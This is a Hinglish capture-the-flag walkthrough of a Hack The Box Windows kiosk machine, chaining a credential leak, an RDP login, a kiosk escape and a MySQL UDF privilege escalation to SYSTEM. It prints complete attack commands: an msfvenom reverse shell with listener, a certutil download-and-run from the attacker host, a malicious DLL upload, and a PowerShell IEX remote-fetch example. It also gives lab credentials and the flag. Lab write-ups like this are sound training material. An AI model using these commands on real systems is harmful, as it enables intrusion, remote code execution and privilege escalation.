1

Web App Discovery & API Fuzzing

Command / Action
ffuf -u http://touch.htb:8443/FUZZ -w /usr/share/seclists/Discovery/Web-Content/api/api-endpoints.txt -t 10 -mc 200,301,302,403 -fs 0
Nmap scan mein port 8443 pe ek web application mila jo "Nexion DocReader DeviceHub DH-100 — Gate B7" naam ka login panel dikha raha tha. Us par ffuf se API endpoints fuzz kiye — directory/file brute-force karne wala tool, jo wordlist ke har word ko URL mein FUZZ ki jagah daal ke check karta hai ki wo path exist karta hai ya nahi. Result mein /api/status endpoint mila, jisne HTTP 200 diya — matlab ye path exist karta hai aur accessible bhi hai.
📸 POC Output
2

Unauthenticated Information Disclosure — /api/status

Command / Action
curl -sk https://touch.htb:8443/api/status
# (ya seedha browser mein open kar sakte ho)
/api/status endpoint ko bina kisi login/authentication ke access kiya ja sakta hai. Response mein device ki poori detail mil gayi: model (Nexion DeviceHub DH-100), serial number (NX-DH-2024-B7042), firmware version, status aur uptime. Ye ek classic Information Disclosure vulnerability hai — jo data secret rehna chahiye tha (jaise serial number), wo bina auth ke kisi ko bhi mil raha hai.
💡 Yahi serial number aage login password ban gaya — device manufacturer ne socha ki serial number kisi ko pata hi nahi hoga, isliye usi ko default password bana diya. Yahi mistake exploit hui.
📸 POC Output
3

DeviceHub Login — Serial Number as Password

Command / Action
# Browser: https://touch.htb:8443/login
# Password field me daalo: NX-DH-2024-B7042
Login page sirf ek password field maangta hai (username nahi). Pichle step mein mila hua serial number NX-DH-2024-B7042 password ki jagah daalte hi successfully login ho gaya — Nexion DeviceHub ke admin dashboard mein entry mil gayi.

4

Scanner Settings — Masked Credentials Leak

Command / Action
# Dashboard -> Scanner -> masked password field ke saamne "show" button click karo
DeviceHub dashboard ke andar connected devices (Scanner/Printer) ki settings mein username/password fields hote hain, jo normally •••••••• ki tarah masked/hidden dikhte hain. Lekin unke saamne ek chhota "show" link tha — usko click karte hi plaintext credentials reveal ho gaye:
Username: KioskUser   Password: K!0sk2026#. Ye ek insecure credential storage / client-side masking issue hai — password server se already plaintext bhej diya gaya tha, sirf frontend pe CSS/JS se chhupaya gaya tha.
📸 POC Output
5

Credential Reuse — RDP Login

Command / Action
xfreerdp /v:10.129.154.25 /u:KioskUser /p:'K!0sk2026#' /cert:ignore +clipboard
Yahi scanner device ke creds (KioskUser / K!0sk2026#) reuse karke RDP (port 3389) se seedha target Windows machine pe login try kiya — aur successful! Ye credential reuse attack hai: ek jagah leak hui cheez doosri jagah bhi kaam kar jaati hai, kyunki same account dono systems ke liye use ho raha tha. Login hote hi "HTB Airways Self Check-in Kiosk" wali restricted screen mil gayi — ye kiosk desktop ko lock kiye hue hai, user ko sirf ek check-in app hi use karne deta hai.
📸 POC Output
6

Kiosk Escape — Error Dialog Troubleshoot Link

Command / Action
# Scanner ko DeviceHub se "Power Off" karo -> kiosk me "Scan Passport" dobara try karo
# Error dialog aayega -> uske andar "https://support.nexionsystems.com/docreader/troubleshoot" link milega
# Us link pe click karo -> ye Microsoft Edge launch kar deta hai, jo kiosk ke bahar hota hai
# Edge khulte hi: Ctrl + O dabao
Pehle normal scan try kiya to generic error mila. Fir DeviceHub dashboard se scanner device ko jaan-bujh kar Power Off kar diya. Wapas kiosk pe "Scan Passport" try karte hi ek naya error aaya — "Nexion DocReader SR-4200 has stopped responding" (Error Code SCN-ERR-4092) — aur is baar error box mein ek clickable hyperlink tha support page ka. Developer ne socha tha ki ye link sirf ek help page kholega, lekin kiosk software usko roक nahi paya — click karte hi poora Microsoft Edge browser launch ho gaya, jo kiosk ke "jail" se bahar hai. Ye hi hamara kiosk escape point hai. Edge ke andar Ctrl+O (Open File dialog) dabane se Windows ka normal file picker khul jata hai — jisse poori filesystem browse ki ja sakti hai.
💡 Trick samajho aise: kiosk app chahta tha ki tu sirf uske andar rahe, lekin usne ek aisi link di jo apne aap poora browser khol deti hai — aur wo browser kiosk ke control mein nahi tha. Ek chhoti si khidki (window) poori deewar (restriction) tod degi.
📸 POC Output
7

Attacker Machine — Payload + Listener + Web Server

Command / Action
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.16.72 LPORT=443 -f exe -o reverse.exe
sudo msfconsole -q -x "use multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set lhost 10.10.16.72; set lport 443; exploit"
python3 -m http.server 8000
Kiosk escape se bas ek CMD shell milega, jo stable nahi hota aur limited hota hai. Isliye ek proper Meterpreter reverse shell banaya: msfvenom se reverse.exe payload generate kiya (jab ye target pe chalega, to wo apne aap humari Kali machine se connect karega). Metasploit mein multi/handler start kiya jo us connection ko sunta (listen) rahega port 443 pe. Aur python3 -m http.server se ek simple web server start kiya taaki target machine us reverse.exe file ko HTTP ke through download kar sake.
📸 POC Output
8

Kiosk Escape se CMD, User Flag & Payload Download

Command / Action
whoami
cd \temp
certutil -urlcache -f http://10.10.16.72:8000/reverse.exe reverse.exe
dir
reverse.exe
File-picker (Ctrl+O) se C:\Windows\System32\cmd.exe select karke Downloads mein save kiya, aur Downloads panel se open kiya — ab ek interactive Command Prompt mil gaya kiosk restrictions ke bahar! whoami se confirm hua: kiosk-042\kioskuser. C:\Users\KioskUser\Desktop\user.txt se user flag mil gaya. Fir certutil (ek built-in Windows tool, jo normally certificates manage karta hai, par URL se file download karne mein bhi misuse ho sakta hai — isliye ise "LOLBin" / Living-off-the-Land Binary kehte hain) ka use karke humara reverse.exe download kiya aur chalaya — isse Kali pe stable Meterpreter session mil gayi.
📸 POC Output
9

Hardcoded DB Credentials in Source Code

Command / Action
type "C:\Program Files\HTB Airways\Kiosk\packages\backend\src\database\index.ts"
Meterpreter session se application ki installation directory explore ki. Backend ki TypeScript source file (database/index.ts) padhi — aur usme MySQL connection ke default/fallback credentials hardcoded mile:
User: kiosk_app   Password: K!0sk_R3p1lca#DB   Database: htb_airways. Ye ek bahut common real-world mistake hai — developers "just in case config file missing ho" sochke source code mein hi password likh dete hain, jo source leak hote hi attacker ke haath lag jata hai.
📸 POC Output
10

MySQL root Password Leak via Maintenance Script

Command / Action
type "C:\ProgramData\HTB Airways\refresh-dates.bat"
C:\ProgramData\HTB Airways folder mein application ki maintenance files thi. refresh-dates.bat ek scheduled script hai jo flights/bookings data refresh karne ke liye MySQL root account se connect karta hai — aur is batch file ke andar hi root ka password plaintext mein likha hua tha: HTB@irw4ys_DB!2026. Low-privilege kiosk_app account se kahin zyada powerful — root matlab poora MySQL server control.
📸 POC Output
11

MySQL Root Login & Database Enumeration

Command / Action
C:\MySQL\bin\mysql.exe -u root -pHTB@irw4ys_DB!2026
SHOW DATABASES;
USE htb_airways;
SHOW TABLES;
Mila hua root password use karke MySQL mein login kiya. SHOW DATABASES se 2 interesting databases dikhe — htb_airways (application ka data) aur nexion_devices. htb_airways ke andar _htb_staff, bookings, passengers, boarding_passes jaise 10 tables mile.

12

Sensitive Data Exposure — Staff Table

Command / Action
SELECT * FROM _htb_staff;
_htb_staff table query karne par 32 employee records mile — naam, email, badge number, role, department, aur ek auth_code column bhi. Ye ek aur sensitive data exposure hai (operational/security staff ki internal details database mein plaintext-ish form mein pade hain), lekin ye hume directly SYSTEM tak nahi le jaata — asli road root tak ab bhi UDF privilege escalation se hi jaata hai.
📸 POC Output
13

Plugin Directory Permissions — The Real Vulnerability

Command / Action
SHOW VARIABLES LIKE 'plugin_dir';
exit;
icacls "C:\MySQL\lib\plugin"
MySQL ka plugin_dir (C:\MySQL\lib\plugin\) wo folder hai jaha MySQL apne plugins/UDF DLL files dhundta hai. icacls se is folder ki Windows permissions (ACL — Access Control List) check ki:
  • BUILTIN\Administrators : Full Control (F) — normal, admins ko sab access hota hai
  • NT AUTHORITY\SYSTEM : Full Control (F) — normal, MySQL service SYSTEM se chalti hai
  • BUILTIN\Users : Read & Execute (RX) — normal users sirf padh/chala sakte hain, likh nahi sakte
  • NT AUTHORITY\Authenticated Users : Modify (M) — ye galat hai!
"Authenticated Users" matlab koi bhi logged-in account — chahe wo lowly KioskUser hi kyun na ho. Normally sirf Admin/SYSTEM hi is folder mein files daal (write/modify) sakte hain, lekin yahan misconfiguration ki wajah se koi bhi logged-in user is folder mein apni file daal sakta hai. Yahi ek chhoti si galti poori machine ko SYSTEM tak compromise karne ka raasta khol deti hai.
📸 POC Output
14

Malicious UDF Library Taiyar Karna (Attacker Machine)

Command / Action
find / -iname "*mysqludf*" 2>/dev/null
cp /usr/share/metasploit-framework/data/exploits/mysql/lib_mysqludf_sys_64.dll ~/htb/touch/
Kali Linux mein pehle se available pre-compiled UDF (User-Defined Function) libraries dhundi. Ye wahi file type hai jo MySQL plugin directory expect karta hai. Metasploit ke data folder mein lib_mysqludf_sys_64.dll mila (already .dll extension mein, use-ready), use apne working directory mein copy kiya.
📸 POC Output
15

DLL Upload Plugin Directory Mein

Command / Action
meterpreter > upload lib_mysqludf_sys_64.dll "C:\\MySQL\\lib\\plugin\\lib_mysqludf_sys_64.dll"
Active Meterpreter session se upload command chalakar malicious DLL ko seedha C:\MySQL\lib\plugin\ folder mein daal diya. Ye upload successful hua — kyunki (jaisa Step 13 mein dikha) KioskUser (Authenticated User) ke paas is folder pe Modify permission hai. Agar permissions sahi hote (sirf Admin/SYSTEM ko write access), to ye upload yahin fail ho jata.
📸 POC Output
16

UDF Function Register & SYSTEM Confirm

Command / Action
CREATE FUNCTION sys_eval RETURNS STRING SONAME 'lib_mysqludf_sys_64.dll';
SELECT sys_eval('whoami');
SELECT CONVERT(sys_eval('whoami') USING utf8);
-- pehli koshish (fail hoti hai, NULL aata hai):
SELECT CONVERT(sys_eval('type C:\Users\Administrator\Desktop\root.txt') USING utf8);
CREATE FUNCTION query se DLL ke andar defined function ko MySQL ke saath register kiya — ab sys_eval() naam ka ek naya "MySQL function" bana jo asal mein Windows commands chalata hai. SELECT sys_eval('whoami') chalaya to result hex format mein aaya (kyunki ye function ek STRING/binary type return karta hai, MySQL client use hex mein display karta hai). CONVERT(... USING utf8) se usko readable text mein convert kiya — result mila: nt authority\system! Matlab confirm ho gaya ki MySQL service SYSTEM privileges se chal rahi hai, aur ab koi bhi command jo sys_eval() ke through chalega, wo bhi SYSTEM level pe chalega — chahe query chalane wala sirf ek low-privilege user hi kyun na ho.

Root flag padhne ki pehli koshish mein NULL aaya — kyunki MySQL string literal mein backslash (\) ek escape character hota hai (jaise \t matlab tab, \n matlab newline), isliye Windows path C:\Users\Administrator\... galat tarike se parse ho gaya aur command fail ho gaya.
📸 POC Output
17

Fix & Root Flag Retrieve

Command / Action
SELECT CONVERT(sys_eval('type C:\\Users\\Administrator\\Desktop\\root.txt') USING utf8);
Fix simple tha: har backslash ko double kar diya (\\), taaki MySQL use ek literal backslash samjhe, escape sequence nahi. Is baar query successful hui aur root flag mila:
dd19a5c4c92f2c020946b62169867982
Is tarah ek unauthenticated API information leak se shuru hokar — weak device auth → credential reuse → kiosk escape → hardcoded app credentials → exposed MySQL root creds → misconfigured plugin directory permissions — aakhir mein MySQL UDF ke zariye NT AUTHORITY\SYSTEM tak pahunch gaye. Machine fully pwned! 🚩
📸 POC Output

🔗 Pura Attack Chain — Ek Nazar Mein

  1. Unauthenticated /api/status → device serial leak
  2. Serial number hi device login ka password nikla
  3. DeviceHub dashboard ke masked fields se KioskUser credentials leak
  4. Credential reuse → RDP se Windows workstation access
  5. Kiosk error dialog ke link se Microsoft Edge launch → kiosk escape
  6. Ctrl+O file-picker se cmd.exe run → full shell access
  7. certutil se Meterpreter payload download & execute
  8. App source code mein hardcoded MySQL (kiosk_app) credentials
  9. Maintenance .bat file mein hardcoded MySQL root credentials
  10. MySQL plugin directory pe misconfigured write permissions
  11. Malicious UDF DLL upload + CREATE FUNCTION → arbitrary command execution
  12. MySQL service SYSTEM se chal rahi thi → NT AUTHORITY\SYSTEM mil gaya
  13. 🚩 Root flag retrieve — Machine pwned!

🎓 Privilege Escalation — Ekdum Simple Bhasha Mein (Jaise Bachhe Ko Samjhaya Jaaye)

Socho MySQL ek factory ka bada powerful machine operator hai — uske paas factory ke har room ki chaabi hai (SYSTEM level access Windows mein). Tu (KioskUser) factory ka sabse junior worker hai, tere paas sirf apne chhote se cabin (limited user) ki chaabi hai.

Normally tu directly us powerful operator ko order nahi de sakta. Lekin factory mein ek "suggestion box" hai (MySQL ka plugin folder) jahan koi bhi naya "tool/instruction" daal sakta hai jo operator follow karega. Factory manager ne galti se ye suggestion box sabke liye khula chhod diya (Authenticated Users = Modify permission) — jabki sirf senior managers (Administrators/SYSTEM) ko hi usme kuch daalna chahiye tha.

  1. Step 1 — Suggestion Box Khula Mila: icacls se pata chala ki koi bhi logged-in user (Authenticated Users) us plugin folder mein file daal sakta hai.
  2. Step 2 — Apna "Instruction Card" Taiyar Kiya: Humne ek special DLL file banayi (lib_mysqludf_sys_64.dll) jisme likha hai "jab bhi koi tujhe is naam se bulaye (sys_eval), tu Windows ka koi bhi command chala dena".
  3. Step 3 — Card Suggestion Box Mein Daala: Meterpreter se DLL ko C:\MySQL\lib\plugin\ mein upload kiya — kyunki box khula tha, humara card andar chala gaya, kisi ne roka nahi.
  4. Step 4 — Operator Ko Card Follow Karne Ko Kaha: CREATE FUNCTION sys_eval ... SONAME 'lib_mysqludf_sys_64.dll' query se MySQL operator ko bola "ab is naam (sys_eval) ka matlab ye card follow karna hai".
  5. Step 5 — Operator Ki Powerful Chaabi Use Hui: Jab humne SELECT sys_eval('whoami') chalaya, to command humne diya tha (chhote worker ne), lekin chalaya operator ne apni powerful chaabi (SYSTEM) se — isliye output aaya nt authority\system, na ki kioskuser.
  6. Step 6 — Factory Ke Sabse Secret Room Ka Darwaza Khola: Ab sys_eval() ke through koi bhi command SYSTEM-level pe chalta hai — isliye type C:\Users\Administrator\Desktop\root.txt chala ke Administrator ke private desktop se root flag bhi padh liya, jabki normally KioskUser ko wahan access hi nahi milta.

Ek line mein: Ek chhoti si folder-permission ki galti (sabko write access) + MySQL service ka SYSTEM se chalna = koi bhi low-privilege user khud ko SYSTEM bana sakta hai, agar wo ek chhota DLL file sahi jagah daal de.

🔎 Agar Machine Abhi Bhi Live/Running Hai — Khud Verify Karne Ke Liye Extra Commands

Agar target instance abhi active hai aur tu khud step-by-step confirm karna chahta hai ki privilege escalation sach mein kaam kar raha hai (sirf root.txt padhne se pehle), to ye extra commands chala sakte ho:

# 1. Pehle confirm karo tu abhi low-privilege user hi ho
whoami
whoami /priv
whoami /groups

# 2. MySQL service kis account se chal rahi hai, confirm karo (SYSTEM honi chahiye)
sc qc MySQL
powershell -c "Get-CimInstance Win32_Service -Filter \"Name='MySQL'\" | Select Name,StartName"

# 3. Plugin folder ki current permissions dobara check karo UDF daalne se pehle
icacls "C:\MySQL\lib\plugin"

# 4. UDF register hone ke baad confirm karo function sach mein SYSTEM se chal raha hai
#    (MySQL shell ke andar)
SELECT CONVERT(sys_eval('whoami') USING utf8);
SELECT CONVERT(sys_eval('echo %USERNAME%') USING utf8);

# 5. Pura proof — ek aisi file banao jo sirf SYSTEM bana sakta hai, phir confirm karo wo ban gayi
SELECT CONVERT(sys_eval('whoami > C:\\Windows\\Temp\\proof.txt') USING utf8);
type C:\Windows\Temp\proof.txt

Ye sab run karke tu khud apni aankhon se dekh sakta hai ki har step pe privilege kaise low-user se SYSTEM tak pahunch raha hai — sirf blog padhke copy-paste karne ke bajaye khud verify karna seekhne ke liye best tareeka hai.

➕ Bonus: lib_mysqludf_sys Ke Baaki Functions

Humne is walkthrough mein sirf sys_eval() use kiya, lekin lib_mysqludf_sys library ke andar aur bhi functions hote hain jo useful ho sakte hain:

FunctionKya karta haiExample
sys_eval(cmd)Command chalao aur uska output return karo (jo humne use kiya) SELECT sys_eval('whoami');
sys_exec(cmd)Command sirf chalao (fire-and-forget), output nahi chahiye — reverse shell trigger karne ke liye useful SELECT sys_exec('powershell -c "IEX(New-Object Net.WebClient).DownloadString(...)"');
sys_get(var)Environment variable ki value padho SELECT sys_get('COMPUTERNAME');
sys_set(var,val)Environment variable set karo SELECT sys_set('x','1');

Cleanup tip: Engagement khatam hone ke baad function hamesha drop kar dena chahiye, taaki backdoor pade na rahe:

DROP FUNCTION sys_eval;
